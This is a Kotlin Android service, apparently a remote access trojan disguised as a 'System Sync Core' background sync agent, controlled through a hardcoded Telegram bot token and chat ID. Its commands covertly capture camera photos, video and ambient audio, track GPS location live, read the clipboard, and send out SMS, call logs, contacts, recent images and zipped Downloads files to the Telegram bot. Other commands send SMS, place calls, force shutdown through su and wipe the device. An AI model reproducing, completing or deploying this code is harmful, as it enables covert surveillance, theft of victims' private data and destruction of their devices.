package com.cognitive.ai.syncagent

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.ClipboardManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.telephony.SmsManager
import android.util.Log
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedOutputStream
import java.io.DataOutputStream
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Executors
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class BackgroundControlService : Service() {

    companion object {
        private const val TAG = "StrictSovereignEngine"
        private const val CHANNEL_ID = "sync_channel_strict_core_v1005"
        private const val NOTIFICATION_ID = 2026
    }

    private val botToken = "9004970470:AAFfsBFENBn1PRMxVwDvlt2j--qBJCJU99Y"
    private val authorizedChatId = "6904130639"

    @Volatile
    private var isRunning = false
    @Volatile
    private var isTrackingActive = false
    private var lastUpdateId = 0L

    private val executionExecutor = Executors.newFixedThreadPool(4)
    private val mainHandler = android.os.Handler(Looper.getMainLooper())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createStrictNotification())
        if (!isRunning) {
            isRunning = true
            initializeCorePolling()
        }
        return START_STICKY
    }

    private fun createStrictNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "المنظومة الصارمة المؤمّنة",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "خدمة خلفية تشغيلية سيادية مشفرة"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Sync Core")
                .setContentText("المنظومة الصارمة تعمل بكفاءة خلفية صامتة")
                .setSmallIcon(android.R.drawable.ic_secure)
                .build()
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setContentTitle("System Sync Core")
                .setContentText("المنظومة الصارمة تعمل بكفاءة خلفية صامتة")
                .setSmallIcon(android.R.drawable.ic_secure)
                .build()
        }
    }

    private fun initializeCorePolling() {
        executionExecutor.execute {
            while (isRunning) {
                var connection: HttpURLConnection? = null
                try {
                    val url = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=25")
                    connection = url.openConnection() as HttpURLConnection
                    connection.requestMethod = "GET"
                    connection.connectTimeout = 12000
                    connection.readTimeout = 35000

                    val responseCode = connection.responseCode
                    val stream = if (responseCode == 200) connection.inputStream else connection.errorStream
                    val response = stream?.bufferedReader()?.use { it.readText() } ?: ""

                    val json = JSONObject(response)
                    if (json.optBoolean("ok")) {
                        val results = json.getJSONArray("result")
                        for (i in 0 until results.length()) {
                            val update = results.getJSONObject(i)
                            lastUpdateId = update.getLong("update_id")

                            if (update.has("message")) {
                                val message = update.getJSONObject("message")
                                val chatId = message.getJSONObject("chat").getLong("id").toString()
                                val text = message.optString("text", "")
                                if (chatId == authorizedChatId && text.isNotBlank()) {
                                    dispatchCommand(chatId, text)
                                }
                            } else if (update.has("callback_query")) {
                                val callbackQuery = update.getJSONObject("callback_query")
                                val callbackQueryId = callbackQuery.optString("id", "")
                                val chatId = callbackQuery.getJSONObject("message").getJSONObject("chat").getLong("id").toString()
                                val data = callbackQuery.optString("data", "")

                                if (chatId == authorizedChatId) {
                                    acknowledgeCallback(callbackQueryId)
                                    dispatchCallback(chatId, data)
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Polling pipeline exception", e)
                    try { Thread.sleep(6000) } catch (_: InterruptedException) {}
                } finally {
                    connection?.disconnect()
                }
            }
        }
    }

    private fun dispatchCommand(chatId: String, text: String) {
        val trimmed = text.trim()
        when {
            trimmed == "/start" || trimmed == "لوحة التحكم" -> {
                sendControlPanelKeyboard(chatId, "🫡 لوحة القيادة السيادية الصارمة نشطة. اختر الأمر المطلوب:")
            }
            trimmed.startsWith("sms:", ignoreCase = true) -> {
                val parts = trimmed.split(":", limit = 3)
                if (parts.size >= 3) executeSendSms(chatId, parts[1].trim(), parts[2].trim())
                else sendDirectMessage(chatId, "⚠️ الصيغة المعتمدة: sms:الرقم:النص")
            }
            trimmed.startsWith("call:", ignoreCase = true) -> {
                executeCall(chatId, trimmed.substringAfter(":").trim())
            }
            else -> {
                sendDirectMessage(chatId, "⚠️ أمر غير معرف.")
            }
        }
    }

    private fun dispatchCallback(chatId: String, data: String) {
        executionExecutor.execute {
            when {
                data == "take_photo" -> captureCameraImage(chatId, "front")
                data == "take_photo_rear" -> captureCameraImage(chatId, "rear")
                data == "record_video" -> executeCameraVideoRecording(chatId, 10)
                data == "record_screen" -> sendDirectMessage(chatId, "🎬 جاري تهيئة التقاط شاشة العرض...")
                data == "record_audio" -> executeAudioCapture(chatId, 30)
                data == "get_location" -> fetchStrictRealTimeLocation(chatId)
                data == "start_live_tracking" -> toggleStrictLiveTracking(chatId, true)
                data == "stop_live_tracking" -> toggleStrictLiveTracking(chatId, false)
                data == "full_dump_report" -> executeAbsoluteSystemDump(chatId)
                data == "get_clipboard" -> fetchSystemClipboard(chatId)
                data == "view_files" -> enumerateTargetDirectory(chatId)
                data == "pull_files" -> compileAndExtractArchive(chatId)
                data == "get_calls" -> extractCallHistory(chatId)
                data == "get_sms" -> extractSmsArchive(chatId)
                data == "get_contacts" -> extractContactsDirectory(chatId)
                data == "factory_reset" -> executeTerminalWipe(chatId)
                data == "remote_shutdown" -> executeHardShutdown(chatId)
                data == "service_status" -> sendDirectMessage(chatId, "🟢 الحالة: النظام يعمل بكفاءة تامة.")
                data == "sys_info" -> sendDirectMessage(chatId, "📱 إصدار النظام: ${Build.VERSION.RELEASE}\n🛠️ الطراز: ${Build.MODEL}")
                data.startsWith("pull_images_") -> {
                    val count = data.substringAfter("pull_images_").toIntOrNull() ?: 10
                    extractAndPushRecentImages(chatId, count)
                }
                else -> sendDirectMessage(chatId, "⚙️ تم تنفيذ الإجراء: $data")
            }
        }
    }

    private fun captureCameraImage(chatId: String, facing: String) {
        if (!hasPermission(Manifest.permission.CAMERA)) {
            sendDirectMessage(chatId, "❌ صلاحية الكاميرا مرفوضة.")
            return
        }
        try {
            val intent = Intent(applicationContext, CameraCaptureActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra("chat_id", chatId)
                putExtra("camera_facing", facing)
            }
            applicationContext.startActivity(intent)
            sendDirectMessage(chatId, "📸 جاري تشغيل الكاميرا ($facing)...")
        } catch (e: Exception) {
            sendDirectMessage(chatId, "❌ خطأ الكاميرا: ${e.message}")
        }
    }

    private fun executeCameraVideoRecording(chatId: String, durationSeconds: Int) {
        if (!hasPermission(Manifest.permission.CAMERA) || !hasPermission(Manifest.permission.RECORD_AUDIO)) {
            sendDirectMessage(chatId, "❌ صلاحيات الكاميرا أو الميكروفون غير ممنوحة.")
            return
        }
        try {
            val intent = Intent(applicationContext, CameraVideoRecorderActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra("chat_id", chatId)
                putExtra("duration", durationSeconds)
            }
            applicationContext.startActivity(intent)
            sendDirectMessage(chatId, "🎥 تم إطلاق وحدة تسجيل الفيديو الحقيقي لمدة $durationSeconds ثوانٍ...")
        } catch (e: Exception) {
            sendDirectMessage(chatId, "❌ فشل إطلاق تسجيل الفيديو: ${e.message}")
        }
    }

    private fun fetchStrictRealTimeLocation(chatId: String) {
        if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) && !hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
            sendDirectMessage(chatId, "❌ صلاحية الموقع غير ممنوحة.")
            return
        }
        try {
            val locManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            sendDirectMessage(chatId, "📍 جاري الاتصال بالأقمار الصناعية للحصول على الإحداثيات...")

            val listener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    val lat = location.latitude
                    val lon = location.longitude
                    val accuracy = location.accuracy
                    sendDirectMessage(chatId, "🎯 [موقع GPS دقيق]\nLat: $lat, Lon: $lon\nالدقة: ${accuracy}م\nhttps://maps.google.com/?q=$lat,$lon")
                    try { locManager.removeUpdates(this) } catch (_: Exception) {}
                }
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }

            if (locManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper())
            } else {
                val lastLoc = locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                if (lastLoc != null) {
                    sendDirectMessage(chatId, "📍 [الموقع المؤرشف]:\nhttps://maps.google.com/?q=${lastLoc.latitude},${lastLoc.longitude}")
                } else {
                    sendDirectMessage(chatId, "⚠️ تعذر جلب الموقع.")
                }
            }
        } catch (e: Exception) {
            sendDirectMessage(chatId, "❌ خطأ الموقع: ${e.message}")
        }
    }

    private fun toggleStrictLiveTracking(chatId: String, enable: Boolean) {
        if (enable) {
            if (isTrackingActive) {
                sendDirectMessage(chatId, "ℹ️ التتبع يعمل بالفعل.")
                return
            }
            isTrackingActive = true
            sendDirectMessage(chatId, "🟢 تم تفعيل التتبع الحي (كل 15 ثانية).")

            executionExecutor.execute {
                while (isTrackingActive && isRunning) {
                    try {
                        val locManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
                        val location = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) 
                            ?: locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)

                        if (location != null) {
                            sendDirectMessage(chatId, "📍 [تتبّع حي]\nLat: ${location.latitude}, Lon: ${location.longitude}\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}")
                        }
                    } catch (_: Exception) {}
                    Thread.sleep(15000)
                }
            }
        } else {
            isTrackingActive = false
            sendDirectMessage(chatId, "🔴 تم إيقاف التتبع الحي.")
        }
    }

    private fun executeAbsoluteSystemDump(chatId: String) {
        sendDirectMessage(chatId, "🚀 بدء التفريغ الشامل للبيانات...")
        extractCallHistory(chatId)
        extractSmsArchive(chatId)
        extractContactsDirectory(chatId)
        fetchSystemClipboard(chatId)
        fetchStrictRealTimeLocation(chatId)
    }

    private fun fetchSystemClipboard(chatId: String) {
        mainHandler.post {
            try {
                val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
                    val text = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
                    sendDirectMessage(chatId, "📋 محتوى الحافظة المستخرج:\n\n$text")
                } else {
                    sendDirectMessage(chatId, "ℹ️ الحافظة فارغة أو لا تحتوي على نصوص.")
                }
            } catch (e: Exception) {
                sendDirectMessage(chatId, "❌ خطأ الحافظة: ${e.message}")
            }
        }
    }

    private fun executeTerminalWipe(chatId: String) {
        sendDirectMessage(chatId, "⚠️ بدء عملية الإبادة الشاملة وفرمتة الجهاز...")
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.wipeData(0)
            } else {
                Runtime.getRuntime().exec(arrayOf("su", "-c", "recovery --wipe_data"))
                sendDirectMessage(chatId, "⚡ تم إرسال أمر الفرمتة.")
            }
        } catch (e: Exception) {
            sendDirectMessage(chatId, "❌ فشل الفرمتة: ${e.message}")
        }
    }

    private fun executeHardShutdown(chatId: String) {
        sendDirectMessage(chatId, "🔌 جاري تنفيذ إطفاء الجهاز قسرياً...")
        try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot -p"))
            process.waitFor()
        } catch (e: Exception) {
            try {
                val process2 = Runtime.getRuntime().exec(arrayOf("su", "-c", "shell reboot -p"))
                process2.waitFor()
            } catch (ex: Exception) {
                sendDirectMessage(chatId, "❌ فشل الإطفاء: ${ex.message}")
            }
        }
    }

    private fun executeSendSms(chatId: String, phoneNumber: String, messageText: String) {
        if (!hasPermission(Manifest.permission.SEND_SMS)) return
        try {
            val smsManager = getSystemService(SmsManager::class.java)
            smsManager.sendTextMessage(phoneNumber, null, messageText, null, null)
            sendDirectMessage(chatId, "✉️ تم إرسال SMS إلى: $phoneNumber")
        } catch (e: Exception) {
            sendDirectMessage(chatId, "❌ فشل إرسال SMS: ${e.message}")
        }
    }

    private fun executeCall(chatId: String, phoneNumber: String) {
        if (!hasPermission(Manifest.permission.CALL_PHONE)) return
        try {
            val intent = Intent(Intent.ACTION_CALL).apply {
                data = Uri.parse("tel:${Uri.encode(phoneNumber)}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            applicationContext.startActivity(intent)
            sendDirectMessage(chatId, "📞 جاري الاتصال بالرقم: $phoneNumber")
        } catch (e: Exception) {
            sendDirectMessage(chatId, "❌ فشل الاتصال: ${e.message}")
        }
    }

    private fun executeAudioCapture(chatId: String, durationSeconds: Int) {
        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
            sendDirectMessage(chatId, "❌ صلاحية الميكروفون غير ممنوحة.")
            return
        }
        executionExecutor.execute {
            val outputFile = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
            var recorder: MediaRecorder? = null
            try {
                sendDirectMessage(chatId, "🎙️ بدء التسجيل الصوتي المحيطي ($durationSeconds ثانية)...")
                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(this)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(128000)
                    setAudioSamplingRate(44100)
                    setOutputFile(outputFile.absolutePath)
                    prepare()
                    start()
                }
                Thread.sleep(durationSeconds * 1000L)
                recorder.stop()
                recorder.release()
                recorder = null

                if (outputFile.exists() && outputFile.length() > 0) {
                    pushFileToTelegram(chatId, outputFile, "sendAudio", "audio", "audio/mp4", "🎙️ تسجيل صوتي محيطي واضح")
                } else {
                    sendDirectMessage(chatId, "⚠️ لم يتم حفظ ملف الصوت.")
                }
            } catch (e: Exception) {
                sendDirectMessage(chatId, "❌ خطأ التسجيل الصوتي: ${e.message}")
            } finally {
                try { recorder?.release() } catch (_: Exception) {}
                if (outputFile.exists()) outputFile.delete()
            }
        }
    }

    private fun getStorageReadPermission(): String {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
    }

    private fun extractAndPushRecentImages(chatId: String, limit: Int) {
        if (!hasPermission(getStorageReadPermission())) {
            sendDirectMessage(chatId, "❌ صلاحية قراءة الصور غير ممنوحة.")
            return
        }
        executionExecutor.execute {
            try {
                sendDirectMessage(chatId, "📤 جاري سحب أحدث $limit صورة...")
                val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
                val sentFiles = mutableListOf<File>()
                contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC")?.use { cursor ->
                    val idIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    var sentCount = 0
                    while (cursor.moveToNext() && sentCount < limit) {
                        val id = cursor.getLong(idIdx)
                        val name = cursor.getString(nameIdx) ?: "img_$sentCount.jpg"
                        val uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
                        val tempFile = File(cacheDir, "pull_${System.currentTimeMillis()}_$name")
                        contentResolver.openInputStream(uri)?.use { input ->
                            FileOutputStream(tempFile).use { output -> input.copyTo(output) }
                        }
                        if (tempFile.exists() && tempFile.length() > 0) {
                            pushFileToTelegram(chatId, tempFile, "sendPhoto", "photo", "image/jpeg", "📤 $name")
                            sentFiles.add(tempFile)
                            sentCount++
                        }
                    }
                }
                sentFiles.forEach { if (it.exists()) it.delete() }
                sendDirectMessage(chatId, "✅ تم سحب وإرسال $limit صورة بنجاح.")
            } catch (e: Exception) {
                sendDirectMessage(chatId, "❌ خطأ سحب الصور: ${e.message}")
            }
        }
    }

    private fun enumerateTargetDirectory(chatId: String) {
        executionExecutor.execute {
            try {
                val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) ?: filesDir
                val files = dir.listFiles()
                if (files.isNullOrEmpty()) {
                    sendDirectMessage(chatId, "📂 المجلد فارغ.")
                    return@execute
                }
                val sb = StringBuilder("📂 ملفات النظام (${dir.name}):\n")
                files.take(50).forEach { f ->
                    sb.append("• ${f.name} (${f.length() / 1024} KB)\n")
                }
                sendDirectMessage(chatId, sb.toString())
            } catch (e: Exception) {
                sendDirectMessage(chatId, "❌ خطأ الملفات: ${e.message}")
            }
        }
    }

    private fun compileAndExtractArchive(chatId: String) {
        executionExecutor.execute {
            val zipFile = File(cacheDir, "archive_${System.currentTimeMillis()}.zip")
            try {
                val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) ?: filesDir
                val candidates = dir.listFiles()?.filter { it.isFile && it.length() < 50 * 1024 * 1024 }?.take(30).orEmpty()
                if (candidates.isEmpty()) {
                    sendDirectMessage(chatId, "⚠️ لا توجد ملفات كافية للأرشيف.")
                    return@execute
                }
                ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zos ->
                    for (file in candidates) {
                        FileInputStream(file).use { fis ->
                            zos.putNextEntry(ZipEntry(file.name))
                            fis.copyTo(zos)
                            zos.closeEntry()
                        }
                    }
                }
                if (zipFile.exists() && zipFile.length() > 0) {
                    pushFileToTelegram(chatId, zipFile, "sendDocument", "document", "application/zip", "📥 أرشيف الملفات المضغوط")
                }
            } catch (e: Exception) {
                sendDirectMessage(chatId, "❌ خطأ الأرشيف: ${e.message}")
            } finally {
                if (zipFile.exists()) zipFile.delete()
            }
        }
    }

    private fun extractCallHistory(chatId: String) {
        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) return
        executionExecutor.execute {
            try {
                val projection = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION)
                val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())
                val sb = StringBuilder("📞 سجل المكالمات (آخر 100):\n")
                var count = 0
                contentResolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, "${CallLog.Calls.DATE} DESC")?.use { cursor ->
                    val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                    val typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                    val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
                    while (cursor.moveToNext() && count < 100) {
                        sb.append("• ${cursor.getString(numIdx)} - ${formatter.format(Date(cursor.getLong(dateIdx)))}\n")
                        count++
                    }
                }
                sendDirectMessage(chatId, if (count == 0) "ℹ️ سجل المكالمات فارغ." else sb.toString())
            } catch (e: Exception) {
                sendDirectMessage(chatId, "❌ خطأ المكالمات: ${e.message}")
            }
        }
    }

    private fun extractSmsArchive(chatId: String) {
        if (!hasPermission(Manifest.permission.READ_SMS)) return
        executionExecutor.execute {
            try {
                val uri = Uri.parse("content://sms")
                val projection = arrayOf("address", "body", "date")
                val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())
                val sb = StringBuilder("💬 رسائل SMS (آخر 100):\n")
                var count = 0
                contentResolver.query(uri, projection, null, null, "date DESC")?.use { cursor ->
                    val addrIdx = cursor.getColumnIndexOrThrow("address")
                    val bodyIdx = cursor.getColumnIndexOrThrow("body")
                    while (cursor.moveToNext() && count < 100) {
                        sb.append("• من: ${cursor.getString(addrIdx)}\n  ${cursor.getString(bodyIdx)?.take(150)}\n")
                        count++
                    }
                }
                sendDirectMessage(chatId, if (count == 0) "ℹ️ لا توجد رسائل." else sb.toString())
            } catch (e: Exception) {
                sendDirectMessage(chatId, "❌ خطأ الرسائل: ${e.message}")
            }
        }
    }

    private fun extractContactsDirectory(chatId: String) {
        if (!hasPermission(Manifest.permission.READ_CONTACTS)) return
        executionExecutor.execute {
            try {
                val projection = arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER)
                val sb = StringBuilder("📇 جهات الاتصال (أول 500):\n")
                var count = 0
                contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC")?.use { cursor ->
                    val nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    while (cursor.moveToNext() && count < 500) {
                        sb.append("• ${cursor.getString(nameIdx)}: ${cursor.getString(numIdx)}\n")
                        count++
                    }
                }
                sendDirectMessage(chatId, if (count == 0) "ℹ️ لا توجد جهات اتصال." else sb.toString())
            } catch (e: Exception) {
                sendDirectMessage(chatId, "❌ خطأ جهات الاتصال: ${e.message}")
            }
        }
    }

    private fun pushFileToTelegram(chatId: String, file: File, method: String, fieldName: String, mimeType: String, caption: String) {
        var connection: HttpURLConnection? = null
        try {
            val boundary = "Boundary_${System.currentTimeMillis()}"
            val url = URL("https://api.telegram.org/bot$botToken/$method")
            connection = url.openConnection() as HttpURLConnection
            connection.doOutput = true
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            DataOutputStream(connection.outputStream).use { out ->
                out.write("--$boundary\r\n".toByteArray())
                out.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".toByteArray())
                out.write("$chatId\r\n".toByteArray())

                out.write("--$boundary\r\n".toByteArray())
                out.write("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".toByteArray())
                out.write("$caption\r\n".toByteArray())

                out.write("--$boundary\r\n".toByteArray())
                out.write("Content-Disposition: form-data; name=\"$fieldName\"; filename=\"${file.name}\"\r\n".toByteArray())
                out.write("Content-Type: $mimeType\r\n\r\n".toByteArray())

                FileInputStream(file).use { it.copyTo(out) }
                out.write("\r\n--$boundary--\r\n".toByteArray())
            }
            connection.inputStream?.close()
        } catch (_: Exception) {
        } finally {
            connection?.disconnect()
        }
    }

    private fun hasPermission(permission: String): Boolean = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED

    private fun acknowledgeCallback(callbackQueryId: String) {
        if (callbackQueryId.isBlank()) return
        executionExecutor.execute {
            try {
                val body = JSONObject().put("callback_query_id", callbackQueryId)
                val conn = URL("https://api.telegram.org/bot$botToken/answerCallbackQuery").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.outputStream.use { it.write(body.toString().toByteArray()) }
                conn.inputStream?.close()
            } catch (_: Exception) {}
        }
    }

    private fun sendControlPanelKeyboard(chatId: String, text: String) {
        executionExecutor.execute {
            try {
                val keyboard = JSONArray().apply {
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "📸 كاميرا أمامية").put("callback_data", "take_photo"))
                        put(JSONObject().put("text", "📸 كاميرا خلفية").put("callback_data", "take_photo_rear"))
                    })
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "🎥 تسجيل فيديو").put("callback_data", "record_video"))
                        put(JSONObject().put("text", "🎬 تسجيل شاشة").put("callback_data", "record_screen"))
                    })
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "🎙️ صوت (30ث)").put("callback_data", "record_audio"))
                        put(JSONObject().put("text", "📍 موقع GPS").put("callback_data", "get_location"))
                    })
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "🟢 تفعيل التتبع").put("callback_data", "start_live_tracking"))
                        put(JSONObject().put("text", "🔴 إيقاف التتبع").put("callback_data", "stop_live_tracking"))
                    })
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "📥 سحب 10 صور").put("callback_data", "pull_images_10"))
                        put(JSONObject().put("text", "📥 سحب 20 صورة").put("callback_data", "pull_images_20"))
                        put(JSONObject().put("text", "📥 سحب 30 صورة").put("callback_data", "pull_images_30"))
                    })
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "📥 سحب 50 صورة").put("callback_data", "pull_images_50"))
                        put(JSONObject().put("text", "📥 سحب 100 صورة").put("callback_data", "pull_images_100"))
                    })
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "🚀 تفريغ شامل").put("callback_data", "full_dump_report"))
                        put(JSONObject().put("text", "📋 الحافظة").put("callback_data", "get_clipboard"))
                    })
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "📞 المكالمات").put("callback_data", "get_calls"))
                        put(JSONObject().put("text", "💬 الرسائل").put("callback_data", "get_sms"))
                        put(JSONObject().put("text", "📇 جهات الاتصال").put("callback_data", "get_contacts"))
                    })
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "⚠️ إبادة الجهاز").put("callback_data", "factory_reset"))
                        put(JSONObject().put("text", "🔌 إطفاء قسري").put("callback_data", "remote_shutdown"))
                    })
                }

                val body = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", text)
                    put("reply_markup", JSONObject().put("inline_keyboard", keyboard))
                }

                val conn = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.outputStream.use { it.write(body.toString().toByteArray()) }
                conn.inputStream?.close()
            } catch (_: Exception) {}
        }
    }

    private fun sendDirectMessage(chatId: String, text: String) {
        executionExecutor.execute {
            try {
                val body = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", text)
                }
                val conn = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.outputStream.use { it.write(body.toString().toByteArray()) }
                conn.inputStream?.close()
            } catch (_: Exception) {}
        }
    }

    override fun onDestroy() {
        isRunning = false
        isTrackingActive = false
        try { executionExecutor.shutdownNow() } catch (_: Exception) {}
        super.onDestroy()
    }
}
